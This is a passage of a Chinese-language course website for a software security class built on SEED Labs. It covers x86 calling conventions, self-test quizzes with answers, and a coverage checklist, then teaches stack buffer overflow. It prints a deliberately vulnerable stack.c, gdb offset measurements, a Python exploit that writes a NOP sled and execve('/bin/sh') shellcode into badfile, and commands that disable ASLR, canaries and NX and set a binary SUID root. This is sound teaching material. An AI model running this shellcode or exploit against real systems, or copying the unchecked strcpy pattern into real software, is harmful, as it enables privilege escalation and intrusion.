+    <p>反推步骤：① 访问了 <code>ebp+8 / +0xc / +0x10</code> → 有 <strong>3 个参数</strong>、各 4 字节、走栈传递；② 返回值在 <code>eax</code>；③ 结尾是 <code>ret</code> 而不是 <code>ret 12</code> → <strong>调用者清栈</strong>，即 cdecl；④ 有 <code>sub esp,0x18</code> 与 <code>[ebp-4]</code> → 一个局部 int，其余是对齐填充。合起来就是：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">反推结果</span><span>C</span></div>
+      <pre data-lang="c">int f(int a, int b, int c) {
+    int t = a + b * c;   /* imul 先算 b*c，再与 a 相加 */
+    return t;
+}</pre>
+    </div>
+    <p>若结尾是 <code>ret 0xc</code>，应改判为 <strong>stdcall</strong>（被调用者清 12 字节）；若参数从 <code>ecx</code>、<code>edx</code> 取，则应判为 fastcall。这套判断在读别人的 <code>.o</code> 时同样有效。</p>
+
+    <h3>3.5.7 易错点 ×5</h3>
+    <ul>
+      <li><strong>清栈方搞反</strong>：cdecl 是<strong>调用者</strong>清（<code>add esp,N</code> 在 call 之后）；stdcall 是<strong>被调用者</strong>清（<code>ret N</code>）。看到 <code>ret 8</code> 就说明不是 cdecl。</li>
+      <li><strong>64 位仍按 32 位讲</strong>：SysV AMD64 用 <code>rdi…r9</code> 传参，<code>eax</code> 应换成 <code>rax</code>，<code>ebp</code> 换成 <code>rbp</code>。把 <code>ebp+8</code> 的结论套到 64 位会全错。</li>
+      <li><strong>忘记 16 字节对齐</strong>：SysV AMD64 调用前 <code>rsp</code> 必须 16 对齐，否则 <code>movaps</code> 触发 SIGSEGV——手写汇编与构造 ROP 链时最容易踩。</li>
+      <li><strong>ret 之后 esp 没恢复</strong>：漏掉 <code>add esp,N</code>，每次调用 esp 就往下走一截，循环里很快踩穿栈。</li>
+      <li><strong>以为 <code>ebp</code> 一定是帧指针</strong>：开 <code>-fomit-frame-pointer</code>（现代 <code>-O2</code> 默认）后 <code>ebp</code> 被当普通寄存器用，gdb 里看不到规整栈帧。调试与量偏移务必用 <code>-O0 -fno-omit-frame-pointer</code>。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 3.4 寄存器<span>1 题</span></div>
+
+      <div class="q" data-answer="C" data-explain="课件明确：x86 没有直接获取或设置 EIP 的指令，EIP 只能被 jmp/call/ret 等控制流指令间接改变。这正是“改写返回地址即可劫持控制流”的根本原因——你改的不是 EIP，而是 ret 将要弹进 EIP 的那个值。">
+        <div class="q-stem"><span class="qno">1.</span>关于 EIP，下列说法与课件一致的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-9" value="A"><span>A. 可以用 mov 指令直接读写 EIP</span></label>
+          <label class="opt"><input type="radio" name="q3-9" value="B"><span>B. EIP 保存当前指令的地址</span></label>
+          <label class="opt"><input type="radio" name="q3-9" value="C"><span>C. 没有直接设置 EIP 的方法，只能由跳转/调用/返回间接改变</span></label>
+          <label class="opt"><input type="radio" name="q3-9" value="D"><span>D. EIP 由操作系统在每个函数返回时自动清零</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 3.5 调用约定与栈帧<span>4 题</span></div>
+
+      <div class="q" data-answer="A" data-explain="cdecl 规定由调用者清栈：参数是调用者压的，函数返回后紧跟一条 add esp,N。42 里 main 在 call 之后有 add esp,0x10，answer 在 call printf 之后也有 add esp,0x10，两处都印证“调用者清”。">
+        <div class="q-stem"><span class="qno">1.</span>cdecl 约定下，参数区由谁清理？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-10" value="A"><span>A. 调用者，在 call 之后用 add esp,N</span></label>
+          <label class="opt"><input type="radio" name="q3-10" value="B"><span>B. 被调用者，用 ret N</span></label>
+          <label class="opt"><input type="radio" name="q3-10" value="C"><span>C. 由 libc 统一清理</span></label>
+          <label class="opt"><input type="radio" name="q3-10" value="D"><span>D. 由 ret 指令连带清理</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="右到左压栈使第一个参数的位置固定为 ebp+8，可变参数函数（printf）才能从固定起点开始按顺序往高地址读参数；若从左到右，参数个数一变，首参数位置就跟着变。">
+        <div class="q-stem"><span class="qno">2.</span>cdecl 为什么规定参数“从右到左”压栈？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-11" value="A"><span>A. 为了减少内存占用</span></label>
+          <label class="opt"><input type="radio" name="q3-11" value="B"><span>B. 为了让 ret 指令能顺带清栈</span></label>
+          <label class="opt"><input type="radio" name="q3-11" value="C"><span>C. 让首个参数固定在 ebp+8，便于可变参数从固定起点顺序读取</span></label>
+          <label class="opt"><input type="radio" name="q3-11" value="D"><span>D. 为了配合 CPU 的栈缓存</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="SysV AMD64 的整型/指针参数依次放 rdi、rsi、rdx、rcx、r8、r9，浮点放 xmm0–xmm7，超出部分才入栈；返回值在 rax。注意它与 Microsoft x64（rcx、rdx、r8、r9 + 32 字节 shadow space）不同。">
+        <div class="q-stem"><span class="qno">3.</span>Linux 64 位（SysV AMD64）前 6 个整型参数的传递寄存器是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-12" value="A"><span>A. rcx、rdx、r8、r9、r10、r11</span></label>
+          <label class="opt"><input type="radio" name="q3-12" value="B"><span>B. rdi、rsi、rdx、rcx、r8、r9</span></label>
+          <label class="opt"><input type="radio" name="q3-12" value="C"><span>C. eax、ebx、ecx、edx、esi、edi</span></label>
+          <label class="opt"><input type="radio" name="q3-12" value="D"><span>D. 全部通过栈传递</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="连续三次 push 说明有 3 个栈传参；call 之后出现 add esp,12（=3×4）说明由调用者清理，因此是 cdecl。若结尾是 ret 12、且没有 add esp，则是 stdcall。">
+        <div class="q-stem"><span class="qno">4.</span>看到这样一段调用：<code>push 3</code>、<code>push 2</code>、<code>push 1</code>、<code>call f</code>、<code>add esp,12</code>。可判断？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-13" value="A"><span>A. 1 个参数，stdcall</span></label>
+          <label class="opt"><input type="radio" name="q3-13" value="B"><span>B. 3 个参数，stdcall</span></label>
+          <label class="opt"><input type="radio" name="q3-13" value="C"><span>C. 3 个参数，cdecl（调用者清 12 字节）</span></label>
+          <label class="opt"><input type="radio" name="q3-13" value="D"><span>D. 无法判断参数个数</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+
+    <h2>3.6 课件强调清单（本轮自查与补写记录）</h2>
+    <p>本节把 8 份课件里被明确标注为“重点 / 掌握 / 理解 / 了解 / 注意 / 实验”，以及被反复讲的概念，逐条列出来，并对每一条标注页面上的覆盖情况。清单共 <strong>54 条</strong>（其中 10 条来自新并入的 2-4），已覆盖 46 条、原偏浅 4 条（本次已加深）、原缺失 4 条（本次已补写要点）。页码为 <strong>PDF 物理页（1 基）</strong>；状态是本次自查的判断，不是课件原文。</p>
+
+    <h3>3.6.1 课件主线（补写：把零散章节接成一条线）</h3>
+    <p>课件 2-1 第 3 页把整门课的目标写成一句话：<strong>控制流劫持的目标是“执行任意代码”</strong>，并用三个实例串起后续全部内容——缓冲区溢出（第 4 章）、整数溢出（第 5 章）、格式化字符串（第 6 章）。三者手法不同，落点相同：都是把“数据”变成“控制信息”。</p>
+    <p>课件 2-2 第 33 页的小结提出，做缓冲区溢出利用需要四项能力：懂 C 函数与堆栈、懂机器码、懂系统调用、懂字节序与栈帧差异。它们在本站的落点是：C 函数与堆栈 → 3.5 与第 4 章；机器码 → 3.2 的 <code>42.o</code> 反汇编与第 4 章；系统调用 → 第 4 章 <code>execve</code> shellcode；字节序与栈帧差异 → 3.3 / 3.5 与第 5 章（整数回绕依赖小端与无符号语义）。</p>
+
+    <h3>3.6.2 实验环境与参考资料（补写：课件里的“注意”页）</h3>
+    <p>虚拟机镜像手册（<code>___虚拟机镜像.pdf</code>）的四条注意事项，本站此前未成节，这里按要点补上：</p>
+    <ul>
+      <li>建虚拟机时<strong>不要选 Ubuntu (64-bit)</strong>：预建镜像是 32 位，宿主机是 64 位也必须选 32-bit（第 2 页）。</li>
+      <li>磁盘文件只选 <code>SEEDUbuntu-16.04-32bit.vmdk</code>；带 <code>-s0xx</code> 后缀的分片文件不要选（第 3 页）。</li>
+      <li>克隆前必须让虚拟机<strong>完全关机</strong>（不是挂起/Saved 状态），且克隆时不要复制 MAC 地址（第 8 页）。</li>
+      <li>多台虚拟机互通的实验要用 <strong>NAT Network</strong>：NAT 只能上网、Host-only 只能互通，单独一种都不满足“两目标同时可达”（第 10 页）。</li>
+    </ul>
+    <p>参考资料：课件第 0 讲第 3 页列出 SEED Labs（handsonsecurity.net）与《信息系统安全实验教程》——本站第 4 章“运行前提”与第 7 章的三项保护开关，对应的就是 SEED 的 Buffer-Overflow / Format-String 实验流程。</p>
+
+    <h3>3.6.3 结课问答（课件只提问、未给结论）</h3>
+    <p>第 1 讲第 103 页留了两个开放问题，课件<strong>没有给出标准答案</strong>（此处标注“课件未展开”，下面只列可讨论的方向，不作定论）：</p>
+    <ul>
+      <li><strong>共享库按需调用，是否体现了最小特权？</strong>可讨论的方向：按需加载减少常驻代码量，但库一旦映射进地址空间就以该进程权限运行，并不按函数粒度收紧权限——这更像“减少暴露面”，与“最小特权”不完全同义。</li>
+      <li><strong>通过时延探测推断行为，是否属于侧信道？</strong>可讨论的方向：侧信道的定义核心是“利用实现层面的物理/时间特征泄露信息”，时延确实属于此类（Meltdown/Spectre 的 Flush+Reload 也以时间为观测通道，见第 11 章）。</li>
+    </ul>
+
+    <h3>3.6.4 清单</h3>
+    <div class="table-wrap">
+      <table class="checklist">
+        <tr><th>课件 · 页</th><th>原文要点（简短引用）</th><th>状态</th></tr>
+        <tr><td>虚拟机镜像 · 2</td><td>不要选 Ubuntu (64-bit)，预建镜像是 32 位</td><td><span class="badge miss">❌ 缺失→已补写</span></td></tr>
+        <tr><td>虚拟机镜像 · 3</td><td>只选 SEEDUbuntu-16.04-32bit.vmdk，不选 -s0xx 分片</td><td><span class="badge miss">❌ 缺失→已补写</span></td></tr>
+        <tr><td>虚拟机镜像 · 8</td><td>克隆前必须完全关机；不要克隆 MAC</td><td><span class="badge miss">❌ 缺失→已补写</span></td></tr>
+        <tr><td>虚拟机镜像 · 10</td><td>多机实验用 NAT Network（NAT/Host-only 都不满足）</td><td><span class="badge miss">❌ 缺失→已补写</span></td></tr>
+        <tr><td>第0讲 · 2</td><td>综合评分：考试 80%（开卷）、平时 20%</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第0讲 · 5</td><td>48 课时含软件安全、系统模型、控制流劫持、CFI、竞态</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第0讲 · 3</td><td>参考资料：SEED Labs 与《信息系统安全实验教程》</td><td><span class="badge warn">⚠️ 偏浅→已加深</span></td></tr>
+        <tr><td>第1讲 · 55</td><td>两条主线：缓冲区溢出→软件安全；SQL 注入→Web 安全</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 70</td><td>获取访问：攻击 OS 靠缓冲区溢出/口令攻击</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 77</td><td>定义 1.5（安全性=降低成功率与损害）、定理 1.2（主机+网络结合）</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 90</td><td>安全机制设计八大原则</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 95</td><td>木桶原理：整体安全取决于最薄弱环节</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 98</td><td>没有绝对的安全；人是最薄弱环节；越安全越不便</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>第1讲 · 103</td><td>结课问答：共享库按需调用与最小特权；时延探测与侧信道</td><td><span class="badge warn">⚠️ 偏浅→已加深</span></td></tr>
+        <tr><td>软件安全1 · 57</td><td>全册唯一“重点”页：漏洞成因、执行过程、EIP、栈帧、调用约定、序言/结语</td><td><span class="badge ok">✅ 已覆盖</span></td></tr>
+        <tr><td>软件安全1 · 23</td><td>没有直接获取/设置 EIP 的方法</td><td><span class="badge ok">✅ 已覆盖（3.4）</span></td></tr>
+        <tr><td>软件安全1 · 26</td><td>EFLAGS：CF 无符号溢出、OF 有符号溢出、ZF/PF/SF</td><td><span class="badge ok">✅ 已覆盖（3.4）</span></td></tr>
+        <tr><td>软件安全1 · 31</td><td>栈由高向低、堆由低向高（0xC0000000 起向下）</td><td><span class="badge ok">✅ 已覆盖（3.3）</span></td></tr>
+        <tr><td>软件安全1 · 37</td><td>cdecl：参数右→左、call 压返回地址、caller 清栈、eax 返回值</td><td><span class="badge ok">✅ 已覆盖（3.5）</span></td></tr>
+        <tr><td>软件安全1 · 38</td><td>cdecl 是 Linux &amp; GCC 缺省约定</td><td><span class="badge ok">✅ 已覆盖（3.5）</span></td></tr>
+        <tr><td>软件安全1 · 41</td><td>建立帧指针后第一参数在 ebp+8；ebp+4 是返回地址，ebp 存旧 ebp</td><td><span class="badge ok">✅ 已覆盖（3.5）</span></td></tr>
+        <tr><td>软件安全1 · 56</td><td>Prologue/Epilogue：建栈并保存 callee-saved；清栈并恢复</td><td><span class="badge ok">✅ 已覆盖（3.5）</span></td></tr>
+        <tr><td>软件安全2-1 · 3</td><td>控制流劫持目标=执行任意代码；三实例：缓冲区/整数/格式化字符串</td><td><span class="badge warn">⚠️ 偏浅→已加深</span></td></tr>
+        <tr><td>软件安全2-1 · 6</td><td>函数调用压栈内容：参数、当前 EIP（返回地址）、旧 ebp、局部变量</td><td><span class="badge ok">✅ 已覆盖（3.3/3.5）</span></td></tr>
+        <tr><td>软件安全2-1 · 11</td><td>strcpy 不检查长度；攻击代码在栈中执行，ret 后取得 shell</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-1 · 12</td><td>不安全库函数 strcpy/strcat/gets/scanf；strncpy/strncat 也不安全</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-1 · 13</td><td>攻击前提：shellcode 不含 \0；返回前程序不能崩</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-1 · 21</td><td>整数溢出：len1+len2 回绕为 0x100，绕过 &gt;256 检查</td><td><span class="badge ok">✅ 已覆盖（第 5 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 4</td><td>%n 把已输出字符数写入参数所指地址</td><td><span class="badge ok">✅ 已覆盖（第 6 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 8</td><td>printf(user) 泄露栈数据：%08x 逐个打印栈参数</td><td><span class="badge ok">✅ 已覆盖（第 6 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 14</td><td>%[n]c%n 实现任意地址写任意值（4+6=10 → *addr=10）</td><td><span class="badge ok">✅ 已覆盖（第 6 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 31</td><td>绕过 “%400s”：%497d 使 19+497=516=512+4，覆盖返回地址</td><td><span class="badge ok">✅ 已覆盖（第 6 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 33</td><td>小结：需懂 C 与堆栈、机器码、系统调用、字节序与栈帧差异</td><td><span class="badge warn">⚠️ 偏浅→已加深</span></td></tr>
+        <tr><td>软件安全2-2 · 72</td><td>关三项保护并 gcc -fno-stack-protector -z execstack、chown、chmod 4755、randomize_va_space=0</td><td><span class="badge ok">✅ 已覆盖（第 4 章运行前提）</span></td></tr>
+        <tr><td>软件安全2-2 · 77</td><td>gdb 实测：ebp 距 buffer 108，返回地址距 buffer 112</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 78</td><td>NOP 填充提高跳转命中率，shellcode 放在缓冲区末尾</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-2 · 84</td><td>shellcode：eax=11、ebx=/bin/sh、ecx=argv、edx=0、int 0x80</td><td><span class="badge ok">✅ 已覆盖（第 4 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 2</td><td>防御三条路：修 bug/静态分析、NX、运行时 canary</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 5</td><td>W^X：栈与堆不可执行；缺点是不能防 ret2libc/ROP</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 10</td><td>canary 两类：随机 canary 与 terminator canary</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 11</td><td>StackGuard 须重编译；约 8% 开销；仅防 stack smashing</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 26–28</td><td>ASLR 默认不随机化 .text，需 PIE（-fPIE -pie）</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 30</td><td>绕过 ASLR：暴力破解；借内存泄漏取 GOT/PLT</td><td><span class="badge ok">✅ 已覆盖（第 7 章）</span></td></tr>
+        <tr><td>软件安全2-3 · 36</td><td>GOT 存函数地址，首次调用由 PLT 解析回填</td><td><span class="badge ok">✅ 已覆盖（第 7 章，3.2 已铺垫）</span></td></tr>
+        <tr><td>软件安全2-4 · 2 / 9–10</td><td>防御是“不能在栈中运行代码”，攻击是“无须在栈中运行代码”；问如何绕过 NX</td><td><span class="badge miss">❌ 原缺失→已补写（7.14）</span></td></tr>
+        <tr><td>软件安全2-4 · 11–13</td><td>libc.so 运行时加载、所在区域可执行；system 接字符串当命令执行</td><td><span class="badge miss">❌ 原缺失→已补写（8.5）</span></td></tr>
+        <tr><td>软件安全2-4 · 14–31</td><td>用 pro_epi_logue.c 逐帧演示 leave/ret 后栈的变化</td><td><span class="badge miss">❌ 原缺失→已补写（8.6）</span></td></tr>
+        <tr><td>软件安全2-4 · 32–41</td><td>Task A/B/C：取 system/exit 地址、MYSHELL 字符串地址、参数落在 ebp+8</td><td><span class="badge miss">❌ 原缺失→已补写（8.7）</span></td></tr>
+        <tr><td>软件安全2-4 · 46–47</td><td>注意：程序名长度会挪动栈顶环境变量地址（envro → e）</td><td><span class="badge miss">❌ 原缺失→已补写（8.8）</span></td></tr>
+        <tr><td>软件安全2-4 · 57–60</td><td>gadget 以 ret 结尾；ret 的两个效果：弹地址进 EIP、esp 上移</td><td><span class="badge miss">❌ 原缺失→已补写（9.5）</span></td></tr>
+        <tr><td>软件安全2-4 · 66–76</td><td>等价实现：普通函数写法 vs 拆成 gadget 的写法</td><td><span class="badge miss">❌ 原缺失→已补写（9.6）</span></td></tr>
+        <tr><td>软件安全2-4 · 79–90</td><td>ROPgadget 安装、--ropchain、核对 gadget、找覆盖偏移（差一格）</td><td><span class="badge miss">❌ 原缺失→已补写（9.7）</span></td></tr>
+        <tr><td>软件安全2-4 · 92–101</td><td>execve 链：拼 &quot;/bin//sh&quot;、设 ebx/ecx/edx、eax=11、int 0x80</td><td><span class="badge ok">✅ 已覆盖（9.3，本轮补页码）</span></td></tr>
+        <tr><td>软件安全2-4 · 103</td><td>总结：控制流三实例、三攻击方式、三防御手段</td><td><span class="badge warn">⚠️ 原偏浅→已加深（7.14）</span></td></tr>
+      </table>
+    </div>
+    <p class="mem-cap">表：54 条强调清单。状态含义：<span class="badge ok">✅ 已覆盖且深度够</span> <span class="badge warn">⚠️ 原偏浅、本次已加深</span> <span class="badge miss">❌ 原缺失、本次已补写要点</span>。</p>
+    <p>另需说明：第 8、9 章（ret2libc、ROP）已由<strong>新并入的 2-4 讲义</strong>覆盖（第 11–47、49–104 页），页面正文与页码均已对齐；第 10、11 章（竞态与 Dirty COW、Meltdown/Spectre）<strong>仍不在课件正文里</strong>，依据的是 <code>codes-share-to-class</code> 里的实验代码与注释，已标注“课件未展开”。</p>
+
+    <p class="callout ok"><b>进入下一章要带走的三样东西</b>① 返回地址在 <code>ebp+4</code>、位于局部变量数组的高地址侧；② 数组起点到 <code>ebp</code> 的距离可由 gdb 直接量（课上实测 108，故到返回地址是 112）；③ <code>printf</code> 等外部函数的真实地址运行期才确定——这三点分别支撑第 4 章的覆盖构造、第 6 章的任意写、第 7–9 章的绕过思路。</p>
+
+    <h2>3.7 关键术语表</h2>
+    <p>正文里带虚线下划线的术语都可以点，也可以悬停看一句话解释；点一下跳到这里的卡片。条目由本地 <code>assets/gloss-data.js</code> 渲染，不联网。</p>
+    <div id="glossary-list"></div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 4 章 ================= -->
+  <section class="chapter" id="ch4">
+    <div class="ch-kicker">第 4 章 · 对应《第2讲 软件安全2-1》</div>
+    <h1>缓冲区溢出</h1>
+    <p class="lead">溢出的本质只有一句话：<strong>把长度不受控的数据写进定长缓冲区，多出来的部分覆盖了栈上的控制信息</strong>。本章把这个句子拆成可计算的偏移、可构造的输入、可执行的 shellcode。</p>
+
+    <h2>4.1 一个最小的漏洞函数</h2>
+    <p>课件用 <code>func</code> 的简化版说明原理：<code>char buf[128]</code> 后用 <code>strcpy(buf, str)</code>，而 <code>strcpy</code> 不做长度检查。课堂上真正演示的程序是 <a href="src/stack.c">stack.c</a>（第 5–23 行）：</p>
+
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/stack.c · 第 5–23 行</span><span>C</span></div>
+      <pre data-lang="c">int vulfunc(char *str)
+{
+	char buffer[100];
+	strcpy(buffer, str);  //1
+	return 1;
+}
+
+int main(){
+	char str[400];
+	FILE *badfile;
+
+	badfile = fopen("badfile","r");
+	fread(str, sizeof(char), 300, badfile);  //2
+	vulfunc(str);
+
+	printf("Returned properly\n");
+	fclose(badfile);
+	return 0;
+}</pre>
+    </div>
+    <p>两个“坏点”被注释标了出来：//1 的 <code>strcpy</code> 无边界检查；//2 一次读 300 字节进 <code>str[400]</code> 本身没问题，但随后整块交给 <code>vulfunc</code>，后者只准备了 100 字节。<strong>漏洞出在 <code>buffer</code> 与 <code>str</code> 的长度差</strong>。</p>
+
+    <h2>4.2 偏移是怎么量出来的</h2>
+    <p>课件给出的实验步骤（也是 stack.c 文件末尾注释里的流程）：用 <code>-g</code> 编译出 <code>stack_gdb</code>，在 <code>vulfunc</code> 下断点，读 <code>$ebp</code> 与 <code>&amp;buffer</code>，相减得到 108，再加 4（返回地址本身占 4 字节）得到 <strong>112</strong>。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/stack.c · 第 35–64 行（文件内注释的 gdb 步骤）</span><span>注释</span></div>
+      <pre data-lang="text">gcc -g -fno-stack-protector -z execstack -o stack_gdb stack.c
+sudo sysctl -w kernel.randomize_va_space=0
+gdb ./stack_gdb
+b vulfunc
+r
+p $ebp            -> 0xbfffea98
+p &amp;buffer         -> 0xbfffea2c
+p/d 0xbfffea98 - 0xbfffea2c   -> 108
+108 + 4 = 112</pre>
+    </div>
+    <p>于是 badfile 的布局是：前 112 字节填任意非零字节 → 第 112–115 字节写“跳转目标地址”（会盖住 RET）→ 更高地址放 NOP 滑板和 shellcode。课件还解释了“为什么 shellcode 不能放得更低”：早期 32 位栈地址固定，但缓冲区起点以上才是用溢出能可靠写入的区域。</p>
+
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">高地址</div><div class="lbl">shellcode（放在缓冲区末尾）</div></div>
+        <div class="mem-row"><div class="val">…</div><div class="lbl">NOP NOP NOP …（滑板，提高命中率）</div></div>
+        <div class="mem-row mark"><div class="val">offset 112</div><div class="lbl">返回地址 RET ← 填入 shellcode 地址</div></div>
+        <div class="mem-row"><div class="val">offset 108</div><div class="lbl">保存的 ebp（SFP）</div></div>
+        <div class="mem-row"><div class="val">offset 0</div><div class="lbl">buffer[100]（实际可用 108 字节填充到 ebp）</div></div>
+      </div>
+    </div>
+    <div class="mem-cap">图：stack.c 的 badfile 布局。108 是 buffer 到 ebp 的距离，112 是 buffer 到返回地址的距离。</div>
+
+    <h2>4.3 构造输入：stack_exploit.py</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/stack_exploit.py · 第 4–49 行</span><span>Python 3</span></div>
+      <pre data-lang="python">shellcode = (
+	"\x31\xc0" 		# xorl 		%eax,%eax
+	"\x50"			# pushl 	%eax
+	"\x68""//sh"	# pushl 	$0x68732f2f
+	"\x68""/bin"	# pushl 	$0x6369622f
+	"\x89\xe3"		# movl 		%esp,%ebp
+	"\x50"			# pushl 	%eax
+	"\x53"			# pushl 	%ebx
+	"\x89\xe1"		# movl 		%esp, %ecx
+	"\x99"			# cdq
+	"\xb0\x0b"		# movb 		%0x0b,%al
+	"\xcd\x80"		# int 		$0x80
+	).encode('latin-1')
+
+content = bytearray(0x90 for i in range(300))
+start = 300 - len(shellcode)
+content[start:] = shellcode
+
+ret = 0xbfffea88 + 0x77
+distance = 108
+content[distance+4:distance+4+4] = (ret).to_bytes(4,byteorder='little')
+
+file = open("badfile", "wb")
+file.write(content)
+file.close()</pre>
+    </div>
+    <p>逐段看：</p>
+    <ul>
+      <li><code>bytearray(0x90 …)</code> 生成 300 字节的 <code>0x90</code>（x86 的 NOP），整块就是滑板；</li>
+      <li><code>content[start:] = shellcode</code> 把 24 字节 shellcode 贴到末尾；</li>
+      <li><code>ret = 0xbfffea88 + 0x77</code> 是“缓冲区基址 + 调整量”的猜测值，注释里明确写着 <em>try with different n</em>（需要多试）；</li>
+      <li><code>content[112:116]</code> 写入 4 字节小端地址，正好覆盖 RET。</li>
+    </ul>
+    <div class="callout warn">
+      <b>运行前提（必须同时满足）</b>
+      <code>sudo sysctl -w kernel.randomize_va_space=0</code> 关闭 ASLR；<code>gcc -fno-stack-protector -z execstack</code> 关闭 canary 并让栈可执行；<code>sudo chown root stack &amp;&amp; sudo chmod 4755 stack</code> 设置 SUID（课件提醒：<strong>chown 会清掉 suid 位，顺序不能反</strong>）。三者缺一，实验现象就不同。
+    </div>
+
+    <h2>4.4 shellcode 在做什么</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/shellcode.c · 第 4–14 行</span><span>C</span></div>
+      <pre data-lang="c">char shellcode[] =
+	"\x31\xc0\x50\x68//sh\x68/bin"
+	"\x89\xe3\x50\x53\x89\xe1\x99"
+	"\xb0\x0b\xcd\x80";
+int main(void)
+{
+fprintf(stdout,"Length: %d\n",strlen(shellcode));
+//(*(void(*)()) shellcode)();
+((void (*)())shellcode)();
+return 0;
+}</pre>
+    </div>
+    <p>课件对这一串机器码的解释（第 2 讲 2-2 第 84 页）：目标是执行 <code>execve("/bin/sh", argv, 0)</code>，寄存器分工为</p>
+    <ul>
+      <li><code>eax = 0x0b (11)</code>：系统调用号 execve；</li>
+      <li><code>ebx</code>：指向字符串 <code>"/bin/sh"</code>；</li>
+      <li><code>ecx</code>：参数数组地址，<code>argv[0]</code> 指向 <code>"/bin/sh"</code>，<code>argv[1]=0</code>；</li>
+      <li><code>edx = 0</code>：不传环境变量；</li>
+      <li><code>int 0x80</code>：触发系统调用。</li>
+    </ul>
+    <p>注意 <code>shellcode.c</code> 第 11 行被注释掉、第 12 行把数组首地址强制转换成函数指针再调用——这是“验证 shellcode 可用”的标准写法。<strong>风险点</strong>：只有 <code>-z execstack</code> 编译时栈/数据段可执行才能跑通；用 <code>-z noexecstack</code> 编译的版本（<code>nx_shellcode</code>）会在同样调用下崩溃，这正好是第 7 章 NX 的演示素材。</p>
+
+    <h2>4.5 除了返回地址，还能劫持什么</h2>
+    <p>课件列出三类控制劫持方法：</p>
+    <ul>
+      <li><strong>Stack smashing</strong>：溢出局部缓冲区，覆盖返回地址或仅造成崩溃。</li>
+      <li><strong>函数指针</strong>：溢出的 buf 覆盖相邻的函数指针（课件举例 PHP 4.0.2、MS MediaPlayer Bitmaps）。</li>
+      <li><strong>longjmp buffers</strong>：<code>setjmp</code> 把寄存器（含 SP/FP）存到栈中，<code>longjmp</code> 恢复；二者成对使用，<code>setjmp</code> 会返回两次（第一次返回 0，第二次返回 longjmp 的第二个参数）。若攻击者改写保存的缓冲区，就能在异常处理链上劫持控制流。课件另提 C++ 异常处理与 SEH。</li>
+    </ul>
+    <p>同一讲还把溢出按内存区域分成<strong>栈溢出、堆溢出、BSS 溢出</strong>，并强调危险函数：<code>strcpy</code>、<code>strcat</code>、<code>gets</code>、<code>scanf</code>；甚至“安全版”<code>strncpy</code>/<code>strncat</code> 也不安全——<code>strncpy</code> 不保证用 <code>'\0'</code> 结尾。</p>
+
+    <h3>堆溢出与 BSS 溢出的课件示例</h3>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 86 页（堆溢出示例）</span><span>C</span></div>
+      <pre data-lang="c">#define BUFSIZE 16
